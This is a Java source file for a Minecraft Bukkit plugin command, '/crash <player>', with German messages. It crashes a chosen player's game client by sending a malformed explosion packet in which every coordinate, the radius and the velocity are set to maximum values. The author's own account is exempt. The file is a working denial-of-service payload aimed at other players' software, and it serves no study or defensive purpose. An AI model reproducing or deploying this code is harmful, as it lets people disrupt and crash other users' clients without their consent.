package com.karatek.core.commands;

import java.util.Collections;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;

public class Command_Crash implements CommandExecutor {

	@SuppressWarnings("unchecked")
	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		
		Player p =(Player) sender;
		
		if(!p.hasPermission("essentials.crash")){
			p.sendMessage("Dazu hast du keine Rechte!");
		} else {
			if(args.length == 0) {
				p.sendMessage("§cVerwendung: /crash <Spieler>");
			} else if(args.length == 1) {
				Player target = Bukkit.getServer().getPlayer(args[0]);
				if(target == null){
					p.sendMessage("Der Spieler" + args[0] + " ist nicht online!");
					
				} else if(target.getName().equalsIgnoreCase(p.getName())){
					p.sendMessage("§CDu willst dich doch nicht selber crashen oder?");
				} else if(target.getName().equalsIgnoreCase("Karatek_HD")){
					p.sendMessage("§CDu darfst diesen Spieler nicht crashen!");
				} else {
					((CraftPlayer)target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE,
							Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
					
					p.sendMessage("§2Du hast den Spieler §e" + target.getDisplayName() + "gecrashed");
				}
			} else {
				p.sendMessage("§CVerwendung: /crash <Spieler>");
			}
		}
		
		return false;
	}
	
	
	

}